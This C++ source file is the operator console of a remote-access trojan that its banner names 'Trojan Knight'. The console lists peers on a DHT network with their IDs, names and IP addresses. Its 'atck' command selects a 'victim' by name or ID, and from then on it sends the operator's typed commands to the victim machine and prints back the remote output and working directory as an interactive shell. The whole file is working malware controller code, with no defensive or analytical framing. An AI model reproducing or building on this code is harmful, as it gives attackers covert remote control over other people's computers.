#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <iostream>
#include <iomanip>

#include "console.h"

using namespace std;

Console::Console(shared_ptr<Node> n) : node(n) {
	printWelcome();
	cout << endl << ">";
}

Console::~Console() {
	setColor();
	if (connected) disconnect();
}

void Console::chdir(string dir) {
	cwd = dir;
	cout << endl;
	printColored(victim_name, LightBlue);
	printColored("@", Red);
	printColored(string(cwd + ">"), Green);
}

void Console::handleAPNP(string data) {
	if (!connected) return;

	data = data.substr(5);
	
	if (data.substr(0, 3) == "cwd") {
		data = data.substr(4);
		size_t dir_end = data.find('\n');
		string dir = data.substr(0, dir_end);
		
		data = data.substr(dir_end + 1);
		
		string output = data.substr(data.find("output\n") + 7);
		if (!output.empty()) cout << output << endl;

		chdir(dir);
	}
	else {
		string output = data.substr(data.find("output\n") + 7);
		if (!output.empty()) cout << output;
	}
}

void Console::connect(string name) {
	int id = node->dht.getNodeFromName(name)->id;

	if (id == -1) {
		cout << "No user with that name" << endl << endl << ">";
		return;
	}

	connect(id);
}

void Console::connect(int id) {
	if (id == node->id) {
		cout << "Can't connect to yourself" << endl << endl << ">";
		return;
	}

	if (node->dht.getNodeFromId(id)->id == -1) {
		cout << "No user with that id" << endl << endl << ">";
		return;
	}

	if (node->dht.getNodeFromId(id)->connections.size() == 0) {
		cout << "User not connected to network" << endl << endl << ">";
		return;
	}

	victim = id;
	victim_name = node->dht.getNodeFromId(id)->name;

	connected = true;
	node->sendMPNP(victim, "mpnp\ninvoke");
}

void Console::disconnect() {
	node->sendMPNP(victim, "mpnp\nterminate");
	connected = false;
	cout << endl << ">";
}

void Console::setColor(Color text_color, Color background_color) {
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), (WORD)((background_color << 4) | text_color));
}

void Console::printColored(string text, Color text_color, Color background_color) {
	setColor(text_color, background_color);
	cout << text;
	setColor();
}

void Console::printWelcome() {
	printColored(R"(
       _____          _               _  __      _       _     _   
      |_   _| __ ___ (_) __ _ _ __   | |/ /_ __ (_) __ _| |__ | |_ 
        | || '__/ _ \| |/ _` | '_ \  | ' /| '_ \| |/ _` | '_ \| __|
        | || | | (_) | | (_| | | | | | . \| | | | | (_| | | | | |_ 
        |_||_|  \___// |\__,_|_| |_| |_|\_\_| |_|_|\__, |_| |_|\__|
                   |__/                            |___/           

	)", Cyan);
	cout << endl;
}

void Console::printHelp() {
	printColored("help\tdht\tatck [name] id=[id]", Magenta);
	cout << endl;
}

void Console::printDHT() {
	cout << left;

	cout << setfill('-')
		<< "+"
		<< setw(3) << "" << "-+"
		<< setw(8) << "" << "-+"
		<< setw(15) << "" << "-+"
		<< endl
		<< setfill(' ');

	cout << "|"
		<< setw(3) << "ID" << " |"
		<< setw(8) << "Name" << " |"
		<< setw(15) << "IP" << " |"
		<< endl;

	cout << "+"
		<< setfill('-')
		<< setw(3) << "" << "-+"
		<< setw(8) << "" << "-+"
		<< setw(15) << "" << "-+"
		<< endl
		<< setfill(' ');

	for (int i = 0; i < node->dht.nodes.size(); i++) {
		shared_ptr<DHTNode>& dhtnode = node->dht.nodes[i];

		if (dhtnode->level == -1) continue;

		if (dhtnode->id == node->id) {
			cout << "|";
			setColor(LightGray, Red); cout << setw(3) << dhtnode->id; setColor(); cout << " |";
			setColor(LightGray, Red); cout << setw(8) << dhtnode->name; setColor(); cout << " |";
			setColor(LightGray, Red); cout << setw(15) << dhtnode->ip; setColor(); cout << " |";
			cout << endl;
		}
		else if (i % 2 == 0) {
			cout << "|";
			setColor(LightGray, Blue); cout << setw(3) << dhtnode->id; setColor(); cout << " |";
			setColor(LightGray, Blue); cout << setw(8) << dhtnode->name; setColor(); cout << " |";
			setColor(LightGray, Blue); cout << setw(15) << dhtnode->ip; setColor(); cout << " |";
			cout << endl;
		}
		else if (i % 2 == 1) {
			cout << "|";
			setColor(LightGray, LightBlue); cout << setw(3) << dhtnode->id; setColor(); cout << " |";
			setColor(LightGray, LightBlue); cout << setw(8) << dhtnode->name; setColor(); cout << " |";
			setColor(LightGray, LightBlue); cout << setw(15) << dhtnode->ip; setColor(); cout << " |";
			cout << endl;
		}
	}
	
	cout << "+"
		<< setfill('-')
		<< setw(3) << "" << "-+"
		<< setw(8) << "" << "-+"
		<< setw(15) << "" << "-+"
		<< endl
		<< setfill(' ');

	cout << endl;
}

void Console::handleInput(string data) {
	if (connected) {
		if (data == "exit") disconnect();
		else node->sendMPNP(victim, "mpnp\ncommand\n" + data);
	}
	else {
		if (data == "help") {
			printHelp();
			cout << endl << ">";
		}
		else if (data == "dht") {
			printDHT();
			cout << endl << ">";
		}
		else if (data.substr(0, 5) == "atck ") {
			string argument = data.substr(5);

			if (argument.substr(0, 3) == "id=") {
				string number = argument.substr(3);

				try {
					int id = stoi(number);
					connect(id);
				}
				catch (invalid_argument const& e) {
					cout << "Id must be a number" << endl << endl << ">";
				}
			}
			else if (argument.size() > 0) {
				string name = argument.substr(0, argument.find(' '));
				connect(name);
			}
			else {
				cout << "Enter name or id" << endl << endl << ">";
			}
		}
		else cout << "Invalid command" << endl << endl << ">";
	}
}